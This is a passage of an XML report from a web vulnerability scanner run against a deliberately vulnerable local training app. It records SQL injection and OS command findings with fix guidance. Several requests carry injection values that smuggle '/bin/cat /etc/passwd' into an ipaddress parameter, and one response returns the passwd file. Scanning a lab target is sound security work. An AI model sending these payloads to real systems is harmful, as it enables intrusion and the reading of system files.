        <body content-encoding="base64">PCFkb2N0eXBlIGh0bWw+PGh0bWwgbGFuZz0iZW4iPjxoZWFkPjx0aXRsZT5IVFRQIFN0YXR1cyA0MDQg4oCTIE5vdCBGb3VuZDwvdGl0bGU+PHN0eWxlIHR5cGU9InRleHQvY3NzIj5ib2R5IHtmb250LWZhbWlseTpUYWhvbWEsQXJpYWwsc2Fucy1zZXJpZjt9IGgxLCBoMiwgaDMsIGIge2NvbG9yOndoaXRlO2JhY2tncm91bmQtY29sb3I6IzUyNUQ3Njt9IGgxIHtmb250LXNpemU6MjJweDt9IGgyIHtmb250LXNpemU6MTZweDt9IGgzIHtmb250LXNpemU6MTRweDt9IHAge2ZvbnQtc2l6ZToxMnB4O30gYSB7Y29sb3I6YmxhY2s7fSAubGluZSB7aGVpZ2h0OjFweDtiYWNrZ3JvdW5kLWNvbG9yOiM1MjVENzY7Ym9yZGVyOm5vbmU7fTwvc3R5bGU+PC9oZWFkPjxib2R5PjxoMT5IVFRQIFN0YXR1cyA0MDQg4oCTIE5vdCBGb3VuZDwvaDE+PC9ib2R5PjwvaHRtbD4=</body>
    </http-response>

</http-transaction>
            <http-transaction id="91">

    <http-request>
        <status>GET http://localhost/VulnerableApp/BlindSQLInjectionVulnerability%0A HTTP/1.1</status>
        <headers>
            <header field="User-agent" content="python-requests/2.31.0" />
            <header field="Host" content="localhost" />
            <header field="Accept-encoding" content="gzip, deflate" />
            <header field="Accept" content="*/*" />
            <header field="Connection" content="keep-alive" />
            <header field="Content-type" content="application/x-www-form-urlencoded" />
            <header field="Content-length" content="0" />
        </headers>
        <body content-encoding="base64"></body>
    </http-request>

    <http-response>
        <status>HTTP/1.1 404</status>
        <headers>
            <header field="Server" content="openresty/1.21.4.3" />
            <header field="Date" content="Wed, 20 Mar 2024 17:05:36 GMT" />
            <header field="Content-Type" content="application/json" />
            <header field="Transfer-Encoding" content="chunked" />
            <header field="Connection" content="keep-alive" />
            <header field="Vary" content="Origin" />
        </headers>
        <body content-encoding="base64">eyJ0aW1lc3RhbXAiOiIyMDI0LTAzLTIwVDE3OjA1OjM2LjI2MCswMDowMCIsInN0YXR1cyI6NDA0LCJlcnJvciI6Ik5vdCBGb3VuZCIsIm1lc3NhZ2UiOiIiLCJwYXRoIjoiL1Z1bG5lcmFibGVBcHAvQmxpbmRTUUxJbmplY3Rpb25WdWxuZXJhYmlsaXR5JTBBIn0=</body>
    </http-response>

</http-transaction>
            <http-transaction id="92">

    <http-request>
        <status>GET http://localhost/VulnerableApp/BlindSQLInjectionVulnerability/LEVEL_1?id=2%0A HTTP/1.1</status>
        <headers>
            <header field="User-agent" content="python-requests/2.31.0" />
            <header field="Host" content="localhost" />
            <header field="Accept-encoding" content="gzip, deflate" />
            <header field="Accept" content="*/*" />
            <header field="Connection" content="keep-alive" />
            <header field="Content-type" content="application/x-www-form-urlencoded" />
            <header field="Content-length" content="0" />
        </headers>
        <body content-encoding="base64"></body>
    </http-request>

    <http-response>
        <status>HTTP/1.1 200</status>
        <headers>
            <header field="Server" content="openresty/1.21.4.3" />
            <header field="Date" content="Wed, 20 Mar 2024 17:05:36 GMT" />
            <header field="Content-Type" content="text/plain;charset=UTF-8" />
            <header field="Content-Length" content="23" />
            <header field="Connection" content="keep-alive" />
        </headers>
        <body content-encoding="base64">eyAiaXNDYXJQcmVzZW50IjogdHJ1ZX0=</body>
    </http-response>

</http-transaction>
            <http-transaction id="96">

    <http-request>
        <status>GET http://localhost/VulnerableApp/CommandInjection%0A HTTP/1.1</status>
        <headers>
            <header field="User-agent" content="python-requests/2.31.0" />
            <header field="Host" content="localhost" />
            <header field="Accept-encoding" content="gzip, deflate" />
            <header field="Accept" content="*/*" />
            <header field="Connection" content="keep-alive" />
            <header field="Content-type" content="application/x-www-form-urlencoded" />
            <header field="Content-length" content="0" />
        </headers>
        <body content-encoding="base64"></body>
    </http-request>

    <http-response>
        <status>HTTP/1.1 404</status>
        <headers>
            <header field="Server" content="openresty/1.21.4.3" />
            <header field="Date" content="Wed, 20 Mar 2024 17:05:36 GMT" />
            <header field="Content-Type" content="application/json" />
            <header field="Transfer-Encoding" content="chunked" />
            <header field="Connection" content="keep-alive" />
            <header field="Vary" content="Origin" />
        </headers>
        <body content-encoding="base64">eyJ0aW1lc3RhbXAiOiIyMDI0LTAzLTIwVDE3OjA1OjM2LjYyNiswMDowMCIsInN0YXR1cyI6NDA0LCJlcnJvciI6Ik5vdCBGb3VuZCIsIm1lc3NhZ2UiOiIiLCJwYXRoIjoiL1Z1bG5lcmFibGVBcHAvQ29tbWFuZEluamVjdGlvbiUwQSJ9</body>
    </http-response>

</http-transaction>
            <http-transaction id="97">

    <http-request>
        <status>GET http://localhost/VulnerableApp/CommandInjection/LEVEL_1?ipaddress=ZcwKhOPLrexxBbto%0A HTTP/1.1</status>
        <headers>
            <header field="User-agent" content="python-requests/2.31.0" />
            <header field="Host" content="localhost" />
            <header field="Accept-encoding" content="gzip, deflate" />
            <header field="Accept" content="*/*" />
            <header field="Connection" content="keep-alive" />
            <header field="Content-type" content="application/x-www-form-urlencoded" />
            <header field="Content-length" content="0" />
        </headers>
        <body content-encoding="base64"></body>
    </http-request>

    <http-response>
        <status>HTTP/1.1 200</status>
        <headers>
            <header field="Server" content="openresty/1.21.4.3" />
            <header field="Date" content="Wed, 20 Mar 2024 17:05:36 GMT" />
            <header field="Content-Type" content="application/json" />
            <header field="Transfer-Encoding" content="chunked" />
            <header field="Connection" content="keep-alive" />
        </headers>
        <body content-encoding="base64">eyJjb250ZW50IjoicGluZzogYmFkIGFkZHJlc3MgJ1pjd0toT1BMcmV4eEJidG8nXG4iLCJpc1ZhbGlkIjp0cnVlfQ==</body>
    </http-response>

</http-transaction>
            <http-transaction id="99">

    <http-request>
        <status>GET http://localhost/VulnerableApp/CommandInjection/LEVEL_2?ipaddress=lmlyBYkdSkxzTRmb%0A HTTP/1.1</status>
        <headers>
            <header field="User-agent" content="python-requests/2.31.0" />
            <header field="Host" content="localhost" />
            <header field="Accept-encoding" content="gzip, deflate" />
            <header field="Accept" content="*/*" />
            <header field="Connection" content="keep-alive" />
            <header field="Content-type" content="application/x-www-form-urlencoded" />
            <header field="Content-length" content="0" />
        </headers>
        <body content-encoding="base64"></body>
    </http-request>

    <http-response>
        <status>HTTP/1.1 200</status>
        <headers>
            <header field="Server" content="openresty/1.21.4.3" />
            <header field="Date" content="Wed, 20 Mar 2024 17:05:37 GMT" />
            <header field="Content-Type" content="application/json" />
            <header field="Transfer-Encoding" content="chunked" />
            <header field="Connection" content="keep-alive" />
        </headers>
        <body content-encoding="base64">eyJjb250ZW50IjoicGluZzogYmFkIGFkZHJlc3MgJ2xtbHlCWWtkU2t4elRSbWInXG4iLCJpc1ZhbGlkIjp0cnVlfQ==</body>
    </http-response>

</http-transaction>
            <http-transaction id="103">

    <http-request>
        <status>GET http://localhost/VulnerableApp/CommandInjection/LEVEL_6?ipaddress=lmlyBYkdSkxzTRmb%0A HTTP/1.1</status>
        <headers>
            <header field="User-agent" content="python-requests/2.31.0" />
            <header field="Host" content="localhost" />
            <header field="Accept-encoding" content="gzip, deflate" />
            <header field="Accept" content="*/*" />
            <header field="Connection" content="keep-alive" />
            <header field="Content-type" content="application/x-www-form-urlencoded" />
            <header field="Content-length" content="0" />
        </headers>
        <body content-encoding="base64"></body>
    </http-request>

    <http-response>
        <status>HTTP/1.1 200</status>
        <headers>
            <header field="Server" content="openresty/1.21.4.3" />
            <header field="Date" content="Wed, 20 Mar 2024 17:05:37 GMT" />
            <header field="Content-Type" content="application/json" />
            <header field="Transfer-Encoding" content="chunked" />
            <header field="Connection" content="keep-alive" />
        </headers>
        <body content-encoding="base64">eyJjb250ZW50IjoiIiwiaXNWYWxpZCI6dHJ1ZX0=</body>
    </http-response>

</http-transaction>
            <http-transaction id="104">

    <http-request>
        <status>GET http://localhost/VulnerableApp/ErrorBasedSQLInjectionVulnerability%0A HTTP/1.1</status>
        <headers>
            <header field="User-agent" content="python-requests/2.31.0" />
            <header field="Host" content="localhost" />
            <header field="Accept-encoding" content="gzip, deflate" />
            <header field="Accept" content="*/*" />
            <header field="Connection" content="keep-alive" />
            <header field="Content-type" content="application/x-www-form-urlencoded" />
            <header field="Content-length" content="0" />
        </headers>
        <body content-encoding="base64"></body>
    </http-request>

    <http-response>
        <status>HTTP/1.1 404</status>
        <headers>
            <header field="Server" content="openresty/1.21.4.3" />
            <header field="Date" content="Wed, 20 Mar 2024 17:05:37 GMT" />
            <header field="Content-Type" content="application/json" />
            <header field="Transfer-Encoding" content="chunked" />
            <header field="Connection" content="keep-alive" />
            <header field="Vary" content="Origin" />
        </headers>
        <body content-encoding="base64">eyJ0aW1lc3RhbXAiOiIyMDI0LTAzLTIwVDE3OjA1OjM3LjM0OCswMDowMCIsInN0YXR1cyI6NDA0LCJlcnJvciI6Ik5vdCBGb3VuZCIsIm1lc3NhZ2UiOiIiLCJwYXRoIjoiL1Z1bG5lcmFibGVBcHAvRXJyb3JCYXNlZFNRTEluamVjdGlvblZ1bG5lcmFiaWxpdHklMEEifQ==</body>
    </http-response>

</http-transaction>
            <http-transaction id="105">

    <http-request>
        <status>GET http://localhost/VulnerableApp/ErrorBasedSQLInjectionVulnerability/LEVEL_1?id=3%0A HTTP/1.1</status>
        <headers>
            <header field="User-agent" content="python-requests/2.31.0" />
            <header field="Host" content="localhost" />
            <header field="Accept-encoding" content="gzip, deflate" />
            <header field="Accept" content="*/*" />
            <header field="Connection" content="keep-alive" />
            <header field="Content-type" content="application/x-www-form-urlencoded" />
            <header field="Content-length" content="0" />
        </headers>
        <body content-encoding="base64"></body>
    </http-request>

    <http-response>
        <status>HTTP/1.1 200</status>
        <headers>
            <header field="Server" content="openresty/1.21.4.3" />
            <header field="Date" content="Wed, 20 Mar 2024 17:05:37 GMT" />
            <header field="Content-Type" content="text/plain;charset=UTF-8" />
            <header field="Content-Length" content="132" />
            <header field="Connection" content="keep-alive" />
        </headers>
        <body content-encoding="base64">eyAiaXNDYXJQcmVzZW50IjogdHJ1ZSwgImNhckluZm9ybWF0aW9uIjp7ImlkIjozLCJuYW1lIjoiTWVyY2VkZXMtQmVueiIsImltYWdlUGF0aCI6Ii9WdWxuZXJhYmxlQXBwL2ltYWdlcy9jYXJzL01lcmNlZGVzLUJlbnouanBnIn19</body>
    </http-response>

</http-transaction>
            <http-transaction id="111">

    <http-request>
        <status>GET http://localhost/VulnerableApp/Http3xxStatusCodeBasedInjection%0A HTTP/1.1</status>
        <headers>
            <header field="User-agent" content="python-requests/2.31.0" />
            <header field="Host" content="localhost" />
            <header field="Accept-encoding" content="gzip, deflate" />
            <header field="Accept" content="*/*" />
            <header field="Connection" content="keep-alive" />
            <header field="Content-type" content="application/x-www-form-urlencoded" />
            <header field="Content-length" content="0" />
        </headers>
        <body content-encoding="base64"></body>
    </http-request>

    <http-response>
        <status>HTTP/1.1 404</status>
        <headers>
            <header field="Server" content="openresty/1.21.4.3" />
            <header field="Date" content="Wed, 20 Mar 2024 17:05:37 GMT" />
            <header field="Content-Type" content="application/json" />
            <header field="Transfer-Encoding" content="chunked" />
            <header field="Connection" content="keep-alive" />
            <header field="Vary" content="Origin" />
        </headers>
        <body content-encoding="base64">eyJ0aW1lc3RhbXAiOiIyMDI0LTAzLTIwVDE3OjA1OjM3LjU0OCswMDowMCIsInN0YXR1cyI6NDA0LCJlcnJvciI6Ik5vdCBGb3VuZCIsIm1lc3NhZ2UiOiIiLCJwYXRoIjoiL1Z1bG5lcmFibGVBcHAvSHR0cDN4eFN0YXR1c0NvZGVCYXNlZEluamVjdGlvbiUwQSJ9</body>
    </http-response>

</http-transaction>
            <http-transaction id="112">

    <http-request>
        <status>GET http://localhost/VulnerableApp/Http3xxStatusCodeBasedInjection/LEVEL_1?returnTo=%2F%0A HTTP/1.1</status>
        <headers>
            <header field="User-agent" content="python-requests/2.31.0" />
            <header field="Host" content="localhost" />
            <header field="Accept-encoding" content="gzip, deflate" />
            <header field="Accept" content="*/*" />
            <header field="Connection" content="keep-alive" />
            <header field="Content-type" content="application/x-www-form-urlencoded" />
            <header field="Content-length" content="0" />
        </headers>
        <body content-encoding="base64"></body>
    </http-request>

    <http-response>
        <status>HTTP/1.1 302</status>
        <headers>
            <header field="Server" content="openresty/1.21.4.3" />
            <header field="Date" content="Wed, 20 Mar 2024 17:05:37 GMT" />
            <header field="Content-Length" content="0" />
            <header field="Connection" content="keep-alive" />
            <header field="Location" content="/" />
        </headers>
        <body content-encoding="base64"></body>
    </http-response>

</http-transaction>
            <http-transaction id="123">

    <http-request>
        <status>GET http://localhost/VulnerableApp/Http3xxStatusCodeBasedInjection/LEVEL_6?returnTo=%2F%0A HTTP/1.1</status>
        <headers>
            <header field="User-agent" content="python-requests/2.31.0" />
            <header field="Host" content="localhost" />
            <header field="Accept-encoding" content="gzip, deflate" />
            <header field="Accept" content="*/*" />
            <header field="Connection" content="keep-alive" />
            <header field="Content-type" content="application/x-www-form-urlencoded" />
            <header field="Content-length" content="0" />
        </headers>
        <body content-encoding="base64"></body>
    </http-request>

    <http-response>
        <status>HTTP/1.1 302</status>
        <headers>
            <header field="Server" content="openresty/1.21.4.3" />
            <header field="Date" content="Wed, 20 Mar 2024 17:05:37 GMT" />
            <header field="Content-Length" content="0" />
            <header field="Connection" content="keep-alive" />
            <header field="Location" content="http://VulnerableApp-base:9090/" />
        </headers>
        <body content-encoding="base64"></body>
    </http-response>

</http-transaction>
            <http-transaction id="127">

    <http-request>
        <status>GET http://localhost/VulnerableApp/Http3xxStatusCodeBasedInjection/LEVEL_8?returnTo=%2F%0A HTTP/1.1</status>
        <headers>
            <header field="User-agent" content="python-requests/2.31.0" />
            <header field="Host" content="localhost" />
            <header field="Accept-encoding" content="gzip, deflate" />
            <header field="Accept" content="*/*" />
            <header field="Connection" content="keep-alive" />
            <header field="Content-type" content="application/x-www-form-urlencoded" />
            <header field="Content-length" content="0" />
        </headers>
        <body content-encoding="base64"></body>
    </http-request>

    <http-response>
        <status>HTTP/1.1 200</status>
        <headers>
            <header field="Server" content="openresty/1.21.4.3" />
            <header field="Date" content="Wed, 20 Mar 2024 17:05:38 GMT" />
            <header field="Content-Length" content="0" />
            <header field="Connection" content="keep-alive" />
        </headers>
        <body content-encoding="base64"></body>
    </http-response>

</http-transaction>
    </http-transactions>
</vulnerability>
        <vulnerability id="[217]" method="GET" name="Blank http response body" plugin="blank_body" severity="Information" url="http://localhost/VulnerableApp/XSSInImgTagAttribute/LEVEL_5" var="None">
    <description>The URL: &quot;http://localhost/VulnerableApp/XSSInImgTagAttribute/LEVEL_5&quot; returned an empty body, this could indicate an application error.</description>


    <http-transactions>
            <http-transaction id="217">

    <http-request>
        <status>GET http://localhost/VulnerableApp/XSSInImgTagAttribute/LEVEL_5?src=%2FVulnerableApp%2Fimages%2FZAP.png%0A HTTP/1.1</status>
        <headers>
            <header field="User-agent" content="python-requests/2.31.0" />
            <header field="Host" content="localhost" />
            <header field="Accept-encoding" content="gzip, deflate" />
            <header field="Accept" content="*/*" />
            <header field="Connection" content="keep-alive" />
            <header field="Content-type" content="application/x-www-form-urlencoded" />
            <header field="Content-length" content="0" />
        </headers>
        <body content-encoding="base64"></body>
    </http-request>

    <http-response>
        <status>HTTP/1.1 200</status>
        <headers>
            <header field="Server" content="openresty/1.21.4.3" />
            <header field="Date" content="Wed, 20 Mar 2024 17:05:43 GMT" />
            <header field="Content-Type" content="text/plain;charset=UTF-8" />
            <header field="Content-Length" content="0" />
            <header field="Connection" content="keep-alive" />
        </headers>
        <body content-encoding="base64"></body>
    </http-response>

</http-transaction>
    </http-transactions>
</vulnerability>
        <vulnerability id="[995]" method="GET" name="SQL injection" plugin="sqli" severity="High" url="http://localhost/VulnerableApp/CommandInjection/LEVEL_1" var="ipaddress">
    <description>SQL injection in a Unknown database was found at: &quot;http://localhost/VulnerableApp/CommandInjection/LEVEL_1&quot;, using HTTP method GET. The sent data was: &quot;ipaddress=1%272%223&quot; The modified parameter was &quot;ipaddress&quot;.</description>

    <long-description>Due to the requirement for dynamic content of today's web
applications, many rely on a database backend to store data that will
be called upon and processed by the web application (or other
programs). Web applications retrieve data from the database by using
Structured Query Language (SQL) queries.

To meet demands of many
developers, database servers (such as MSSQL, MySQL, Oracle etc.) have
additional built-in functionality that can allow extensive control of
the database and interaction with the host operating system itself.
An SQL injection occurs when a value originating from the client's
request is used within a SQL query without prior sanitisation. This
could allow cyber-criminals to execute arbitrary SQL code and steal
data or use the additional functionality of the database server to
take control of more server components.

The successful exploitation
of a SQL injection can be devastating to an organisation and is one of
the most commonly exploited web application vulnerabilities.

This
injection was detected as the tool was able to cause the server to
respond to the request with a database related error.</long-description>
    <fix-guidance>The only proven method to prevent against SQL injection attacks while
still maintaining full application functionality is to use
parameterized queries (also known as prepared statements). When
utilising this method of querying the database, any value supplied by
the client will be handled as a string value rather than part of the
SQL query.

Additionally, when utilising parameterized queries, the
database engine will automatically check to make sure the string being
used matches that of the column. For example, the database engine will
check that the user supplied input is an integer if the database
column is configured to contain integers.</fix-guidance>
    <fix-effort>50</fix-effort>
    <references>
            <reference title="SecuriTeam" url="http://www.securiteam.com/securityreviews/5DP0N1P76E.html" />
            <reference title="Wikipedia" url="http://en.wikipedia.org/wiki/SQL_injection" />
            <reference title="OWASP" url="https://www.owasp.org/index.php/SQL_Injection" />
            <reference title="WASC" url="http://projects.webappsec.org/w/page/13246963/SQL%20Injection" />
            <reference title="W3 Schools" url="http://www.w3schools.com/sql/sql_injection.asp" />
            <reference title="UnixWiz" url="http://unixwiz.net/techtips/sql-injection.html" />
    </references>

    <http-transactions>
            <http-transaction id="995">

    <http-request>
        <status>GET http://localhost/VulnerableApp/CommandInjection/LEVEL_1?ipaddress=1%272%223 HTTP/1.1</status>
        <headers>
            <header field="User-agent" content="python-requests/2.31.0" />
            <header field="Host" content="localhost" />
            <header field="Accept-encoding" content="gzip, deflate" />
            <header field="Accept" content="*/*" />
            <header field="Connection" content="keep-alive" />
        </headers>
        <body content-encoding="base64"></body>
    </http-request>

    <http-response>
        <status>HTTP/1.1 200</status>
        <headers>
            <header field="Server" content="openresty/1.21.4.3" />
            <header field="Date" content="Wed, 20 Mar 2024 17:06:47 GMT" />
            <header field="Content-Type" content="application/json" />
            <header field="Transfer-Encoding" content="chunked" />
            <header field="Connection" content="keep-alive" />
        </headers>
        <body content-encoding="base64">eyJjb250ZW50Ijoic2g6IHN5bnRheCBlcnJvcjogdW50ZXJtaW5hdGVkIHF1b3RlZCBzdHJpbmdcbiIsImlzVmFsaWQiOnRydWV9</body>
    </http-response>

</http-transaction>
    </http-transactions>
</vulnerability>
        <vulnerability id="[1049]" method="GET" name="OS commanding vulnerability" plugin="os_commanding" severity="High" url="http://localhost/VulnerableApp/CommandInjection/LEVEL_1" var="ipaddress">
    <description>OS Commanding was found at: &quot;http://localhost/VulnerableApp/CommandInjection/LEVEL_1&quot;, using HTTP method GET. The sent data was: &quot;...ipaddress=b'ZcwKhOPLrexxBbto\n'
/bin/cat /etc/passwd...&quot; The modified parameter was &quot;ipaddress&quot;.</description>

    <long-description>To perform specific actions from within a web application, it is
occasionally required to run Operating System commands and have the
output of these commands captured by the web application and returned
to the client.

OS command injection occurs when user supplied input
is inserted into one of these commands without proper sanitisation and
is then executed by the server.

Cyber-criminals will abuse this
weakness to perform their own arbitrary commands on the server. This
can include everything from simple `ping` commands to map the internal
network, to obtaining full control of the server.



It was possible to inject and verify the execution of specific Operating
System commands which indicates that proper input sanitisation is not
occurring.</long-description>
    <fix-guidance>It is recommended that untrusted data is never used to form a command
to be executed by the OS.

To validate data, the application should ensure that the supplied value 
contains only the characters that are required to perform the
required action.

For example, where the form field expects an IP address, only numbers
and periods should be accepted. Additionally, all control operators
(`&amp;`, `&amp;&amp;`, `|`, `||`, `$`, `\`, `#`) should be explicitly denied
and never accepted as valid input by the server.</fix-guidance>
    <fix-effort>50</fix-effort>
    <references>
            <reference title="WASC" url="http://projects.webappsec.org/w/page/13246950/OS%20Commanding" />
            <reference title="OWASP" url="https://www.owasp.org/index.php/OS_Command_Injection" />
    </references>

    <http-transactions>
            <http-transaction id="1049">

    <http-request>
        <status>GET http://localhost/VulnerableApp/CommandInjection/LEVEL_1?ipaddress=b%27ZcwKhOPLrexxBbto%5Cn%27%0A%2Fbin%2Fcat%20%2Fetc%2Fpasswd HTTP/1.1</status>
        <headers>
            <header field="User-agent" content="python-requests/2.31.0" />
            <header field="Host" content="localhost" />
            <header field="Accept-encoding" content="gzip, deflate" />
            <header field="Accept" content="*/*" />
            <header field="Connection" content="keep-alive" />
        </headers>
        <body content-encoding="base64"></body>
    </http-request>

    <http-response>
        <status>HTTP/1.1 200</status>
        <headers>
            <header field="Server" content="openresty/1.21.4.3" />
            <header field="Date" content="Wed, 20 Mar 2024 17:06:49 GMT" />
            <header field="Content-Type" content="application/json" />
            <header field="Transfer-Encoding" content="chunked" />
            <header field="Connection" content="keep-alive" />
        </headers>
        <body content-encoding="base64">eyJjb250ZW50IjoicGluZzogYmFkIGFkZHJlc3MgJ2JaY3dLaE9QTHJleHhCYnRvXFxuJ1xucm9vdDp4OjA6MDpyb290Oi9yb290Oi9iaW4vYXNoXG5iaW46eDoxOjE6YmluOi9iaW46L3NiaW4vbm9sb2dpblxuZGFlbW9uOng6MjoyOmRhZW1vbjovc2Jpbjovc2Jpbi9ub2xvZ2luXG5hZG06eDozOjQ6YWRtOi92YXIvYWRtOi9zYmluL25vbG9naW5cbmxwOng6NDo3OmxwOi92YXIvc3Bvb2wvbHBkOi9zYmluL25vbG9naW5cbnN5bmM6eDo1OjA6c3luYzovc2JpbjovYmluL3N5bmNcbnNodXRkb3duOng6NjowOnNodXRkb3duOi9zYmluOi9zYmluL3NodXRkb3duXG5oYWx0Ong6NzowOmhhbHQ6L3NiaW46L3NiaW4vaGFsdFxubWFpbDp4Ojg6MTI6bWFpbDovdmFyL3Nwb29sL21haWw6L3NiaW4vbm9sb2dpblxubmV3czp4Ojk6MTM6bmV3czovdXNyL2xpYi9uZXdzOi9zYmluL25vbG9naW5cbnV1Y3A6eDoxMDoxNDp1dWNwOi92YXIvc3Bvb2wvdXVjcHB1YmxpYzovc2Jpbi9ub2xvZ2luXG5vcGVyYXRvcjp4OjExOjA6b3BlcmF0b3I6L3Jvb3Q6L2Jpbi9zaFxubWFuOng6MTM6MTU6bWFuOi91c3IvbWFuOi9zYmluL25vbG9naW5cbnBvc3RtYXN0ZXI6eDoxNDoxMjpwb3N0bWFzdGVyOi92YXIvc3Bvb2wvbWFpbDovc2Jpbi9ub2xvZ2luXG5jcm9uOng6MTY6MTY6Y3JvbjovdmFyL3Nwb29sL2Nyb246L3NiaW4vbm9sb2dpblxuZnRwOng6MjE6MjE6Oi92YXIvbGliL2Z0cDovc2Jpbi9ub2xvZ2luXG5zc2hkOng6MjI6MjI6c3NoZDovZGV2L251bGw6L3NiaW4vbm9sb2dpblxuYXQ6eDoyNToyNTphdDovdmFyL3Nwb29sL2Nyb24vYXRqb2JzOi9zYmluL25vbG9naW5cbnNxdWlkOng6MzE6MzE6U3F1aWQ6L3Zhci9jYWNoZS9zcXVpZDovc2Jpbi9ub2xvZ2luXG54ZnM6eDozMzozMzpYIEZvbnQgU2VydmVyOi9ldGMvWDExL2ZzOi9zYmluL25vbG9naW5cbmdhbWVzOng6MzU6MzU6Z2FtZXM6L3Vzci9nYW1lczovc2Jpbi9ub2xvZ2luXG5wb3N0Z3Jlczp4OjcwOjcwOjovdmFyL2xpYi9wb3N0Z3Jlc3FsOi9iaW4vc2hcbmN5cnVzOng6ODU6MTI6Oi91c3IvY3lydXM6L3NiaW4vbm9sb2dpblxudnBvcG1haWw6eDo4OTo4OTo6L3Zhci92cG9wbWFpbDovc2Jpbi9ub2xvZ2luXG5udHA6eDoxMjM6MTIzOk5UUDovdmFyL2VtcHR5Oi9zYmluL25vbG9naW5cbnNtbXNwOng6MjA5OjIwOTpzbW1zcDovdmFyL3Nwb29sL21xdWV1ZTovc2Jpbi9ub2xvZ2luXG5ndWVzdDp4OjQwNToxMDA6Z3Vlc3Q6L2Rldi9udWxsOi9zYmluL25vbG9naW5cbm5vYm9keTp4OjY1NTM0OjY1NTM0Om5vYm9keTovOi9zYmluL25vbG9naW5cbiIsImlzVmFsaWQiOnRydWV9</body>
    </http-response>

</http-transaction>
    </http-transactions>
</vulnerability>
        <vulnerability id="[1259]" method="GET" name="SQL injection" plugin="sqli" severity="High" url="http://localhost/VulnerableApp/CommandInjection/LEVEL_2" var="ipaddress">
    <description>SQL injection in a Unknown database was found at: &quot;http://localhost/VulnerableApp/CommandInjection/LEVEL_2&quot;, using HTTP method GET. The sent data was: &quot;ipaddress=1%272%223&quot; The modified parameter was &quot;ipaddress&quot;.</description>

    <long-description>Due to the requirement for dynamic content of today's web
applications, many rely on a database backend to store data that will
be called upon and processed by the web application (or other
programs). Web applications retrieve data from the database by using
Structured Query Language (SQL) queries.

To meet demands of many
developers, database servers (such as MSSQL, MySQL, Oracle etc.) have
additional built-in functionality that can allow extensive control of
the database and interaction with the host operating system itself.
An SQL injection occurs when a value originating from the client's
request is used within a SQL query without prior sanitisation. This
could allow cyber-criminals to execute arbitrary SQL code and steal
data or use the additional functionality of the database server to
take control of more server components.

The successful exploitation
of a SQL injection can be devastating to an organisation and is one of
the most commonly exploited web application vulnerabilities.

This
injection was detected as the tool was able to cause the server to
respond to the request with a database related error.</long-description>
    <fix-guidance>The only proven method to prevent against SQL injection attacks while
still maintaining full application functionality is to use
parameterized queries (also known as prepared statements). When
utilising this method of querying the database, any value supplied by
the client will be handled as a string value rather than part of the
SQL query.

Additionally, when utilising parameterized queries, the
database engine will automatically check to make sure the string being
used matches that of the column. For example, the database engine will
check that the user supplied input is an integer if the database
column is configured to contain integers.</fix-guidance>
    <fix-effort>50</fix-effort>
    <references>
            <reference title="SecuriTeam" url="http://www.securiteam.com/securityreviews/5DP0N1P76E.html" />
            <reference title="Wikipedia" url="http://en.wikipedia.org/wiki/SQL_injection" />
            <reference title="OWASP" url="https://www.owasp.org/index.php/SQL_Injection" />
            <reference title="WASC" url="http://projects.webappsec.org/w/page/13246963/SQL%20Injection" />
            <reference title="W3 Schools" url="http://www.w3schools.com/sql/sql_injection.asp" />
            <reference title="UnixWiz" url="http://unixwiz.net/techtips/sql-injection.html" />
    </references>

    <http-transactions>
            <http-transaction id="1259">

    <http-request>
        <status>GET http://localhost/VulnerableApp/CommandInjection/LEVEL_2?ipaddress=1%272%223 HTTP/1.1</status>
        <headers>
            <header field="User-agent" content="python-requests/2.31.0" />
            <header field="Host" content="localhost" />
            <header field="Accept-encoding" content="gzip, deflate" />
            <header field="Accept" content="*/*" />
            <header field="Connection" content="keep-alive" />
        </headers>
        <body content-encoding="base64"></body>
    </http-request>

    <http-response>
        <status>HTTP/1.1 200</status>
        <headers>
            <header field="Server" content="openresty/1.21.4.3" />
            <header field="Date" content="Wed, 20 Mar 2024 17:06:55 GMT" />
            <header field="Content-Type" content="application/json" />
            <header field="Transfer-Encoding" content="chunked" />
            <header field="Connection" content="keep-alive" />
        </headers>
        <body content-encoding="base64">eyJjb250ZW50Ijoic2g6IHN5bnRheCBlcnJvcjogdW50ZXJtaW5hdGVkIHF1b3RlZCBzdHJpbmdcbiIsImlzVmFsaWQiOnRydWV9</body>
    </http-response>

</http-transaction>
    </http-transactions>
</vulnerability>
        <vulnerability id="[1301]" method="GET" name="OS commanding vulnerability" plugin="os_commanding" severity="High" url="http://localhost/VulnerableApp/CommandInjection/LEVEL_2" var="ipaddress">
    <description>OS Commanding was found at: &quot;http://localhost/VulnerableApp/CommandInjection/LEVEL_2&quot;, using HTTP method GET. The sent data was: &quot;ipaddress=%3B%2Fbin%2Fcat%20%2Fetc%2Fpasswd&quot; The modified parameter was &quot;ipaddress&quot;.</description>

    <long-description>To perform specific actions from within a web application, it is
occasionally required to run Operating System commands and have the
output of these commands captured by the web application and returned
to the client.

OS command injection occurs when user supplied input
is inserted into one of these commands without proper sanitisation and
is then executed by the server.

Cyber-criminals will abuse this
weakness to perform their own arbitrary commands on the server. This
can include everything from simple `ping` commands to map the internal
network, to obtaining full control of the server.



It was possible to inject and verify the execution of specific Operating
System commands which indicates that proper input sanitisation is not
occurring.</long-description>
    <fix-guidance>It is recommended that untrusted data is never used to form a command
to be executed by the OS.

To validate data, the application should ensure that the supplied value 
contains only the characters that are required to perform the
required action.

For example, where the form field expects an IP address, only numbers
and periods should be accepted. Additionally, all control operators
(`&amp;`, `&amp;&amp;`, `|`, `||`, `$`, `\`, `#`) should be explicitly denied
and never accepted as valid input by the server.</fix-guidance>
    <fix-effort>50</fix-effort>
    <references>
            <reference title="WASC" url="http://projects.webappsec.org/w/page/13246950/OS%20Commanding" />
            <reference title="OWASP" url="https://www.owasp.org/index.php/OS_Command_Injection" />
    </references>

    <http-transactions>
            <http-transaction id="1301">

    <http-request>
        <status>GET http://localhost/VulnerableApp/CommandInjection/LEVEL_2?ipaddress=%3B%2Fbin%2Fcat%20%2Fetc%2Fpasswd HTTP/1.1</status>
        <headers>
            <header field="User-agent" content="python-requests/2.31.0" />
            <header field="Host" content="localhost" />
            <header field="Accept-encoding" content="gzip, deflate" />
            <header field="Accept" content="*/*" />
            <header field="Connection" content="keep-alive" />
        </headers>
        <body content-encoding="base64"></body>
    </http-request>

    <http-response>
        <status>HTTP/1.1 200</status>
        <headers>
            <header field="Server" content="openresty/1.21.4.3" />
            <header field="Date" content="Wed, 20 Mar 2024 17:06:56 GMT" />
            <header field="Content-Type" content="application/json" />
            <header field="Transfer-Encoding" content="chunked" />
            <header field="Connection" content="keep-alive" />
        </headers>
